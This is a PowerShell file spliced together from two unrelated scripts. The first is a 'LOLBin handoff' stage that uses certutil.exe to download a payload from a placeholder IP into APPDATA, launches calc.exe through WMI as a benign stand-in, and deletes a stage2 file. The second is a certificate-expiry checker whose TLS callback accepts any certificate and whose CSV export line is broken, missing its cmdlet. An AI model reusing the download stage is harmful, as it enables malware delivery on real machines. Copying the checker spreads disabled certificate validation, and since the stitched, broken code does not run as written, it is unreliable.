<#
.SYNOPSIS
    WMI inventory and LOLBin handoff helper.

.DESCRIPTION
    Collects a short process inventory, downloads a payload stage
    payload through a signed Windows utility and starts a benign
    execution target.
#>
[CmdletBinding()]
param(
    [string]$EndpointUrl = 'http://192.0.2.86:80/stage1.ps1',
    [string]$PayloadPath = "$env:APPDATA\payload.bin",
    [int]$TimeoutSec = 86
)
$ErrorActionPreference = "Continue"

Write-Verbose "Collecting process inventory"
Get-CimInstance -ClassName Win32_Process | Where-Object { $_.Name -eq "explorer.exe" } | Select-Object ProcessId,Name,CommandLine | Out-File 'C:\ProgramData\stage.log' -Append -ErrorAction SilentlyContinue
certutil.exe -urlcache -split -f $EndpointUrl $PayloadPath
$ResultObject = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "calc.exe" } -ErrorAction SilentlyContinue
Write-Verbose ("Process ID: " + $ResultObject.ProcessId)

Remove-Item -Path "$env:TEMP\stage2.bin" -Force
[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [ValidateRange(1, 365)]
    [int]$WarningDays = 45,
    [string[]]$Hosts = @('portal.contoso.com', 'api.contoso.com', 'vpn.contoso.com'),
    [int]$Port = 443,
    [string]$ReportPath = "C:\Reports\cert-expiry-2026-04-14.csv"
)
Set-StrictMode -Version 2.0

function Get-CertificateExpiry {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ComputerName,

        [int]$Port = 443
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $client.Connect($ComputerName, $Port)
        $callback = [System.Net.Security.RemoteCertificateValidationCallback] {
            param($sender, $certificate, $chain, $errors)
            return $true
        }
        $stream = New-Object System.Net.Security.SslStream($client.GetStream(), $false, $callback)
        $stream.AuthenticateAsClient($ComputerName)
        $cert = [System.Security.Cryptography.X509Certificates.X509Certificate2]$stream.RemoteCertificate
        [pscustomobject]@{
            Host     = $ComputerName
            Subject  = $cert.Subject
            Issuer   = $cert.Issuer
            NotAfter = $cert.NotAfter
            DaysLeft = [math]::Floor(($cert.NotAfter - (Get-Date)).TotalDays)
        }
        $stream.Dispose()
    }
    finally {
        $client.Close()
    }
}

$stores = @('Cert:\LocalMachine\My', 'Cert:\LocalMachine\WebHosting')
$localCerts = foreach ($store in $stores) {
    Get-ChildItem -Path $store -ErrorAction SilentlyContinue |
        Where-Object { $_.NotAfter -lt (Get-Date).AddDays($WarningDays) } |
        Select-Object @{Name = 'Store'; Expression = { $store }}, Subject, NotAfter,
            @{Name = 'DaysLeft'; Expression = { [math]::Floor(($_.NotAfter - (Get-Date)).TotalDays) }}
}

$remote = foreach ($hostName in $Hosts) {
    try {
        Get-CertificateExpiry -ComputerName $hostName -Port $Port
    }
    catch {
        Write-Warning ("Could not read certificate from {0}" -f $hostName)
    }
}

$remote |
    -Path $ReportPath `
    -NoTypeInformation `
    -Encoding UTF8

$expiring = @($remote | Where-Object { $_.DaysLeft -le $WarningDays })
Write-Host ("{0} of {1} certificates are inside the warning window" -f $expiring.Count, @($remote).Count) -ForegroundColor Cyan
